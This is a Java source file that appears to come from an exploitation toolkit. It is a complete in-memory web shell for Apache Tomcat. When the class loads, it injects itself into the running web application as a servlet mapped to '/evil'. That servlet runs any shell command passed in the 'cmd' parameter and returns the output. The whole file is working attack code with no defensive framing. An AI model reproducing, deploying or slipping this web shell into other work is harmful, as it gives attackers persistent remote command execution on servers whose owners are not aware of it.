package xyz.eki.marshalexp.memshell;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

public class MTomcatServlet extends HttpServlet {
    static {
        try{

            Class<?> evilServletClass = MTomcatServlet.class;
            String servletName = evilServletClass.getSimpleName();

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();



            Wrapper wrapper = standardContext.createWrapper();
            wrapper.setName(servletName);
            wrapper.setLoadOnStartup(1);
            wrapper.setServlet((Servlet) evilServletClass.newInstance());
            wrapper.setServletClass(evilServletClass.getName());


            // 向 children 中添加 wrapper
            standardContext.addChild(wrapper);

            // 添加 servletMappings
            standardContext.addServletMappingDecoded("/evil",servletName);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("Injected Code Working");
        String result = "";
        String cmd = req.getParameter("cmd");
        if (cmd != null && cmd.length() > 0) {
            String osTyp = System.getProperty("os.name");
            InputStream in = Runtime.getRuntime().exec((osTyp != null && osTyp.toLowerCase().contains("win")) ? new String[]{"cmd.exe", "/c", req.getParameter("cmd")} : new String[]{"sh", "-c", req.getParameter("cmd")}).getInputStream();
            Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
            result = s.hasNext() ? s.next() : "";
        }
        PrintWriter writer = resp.getWriter();
        writer.print(result);
        writer.flush();
        writer.close();
    }
}
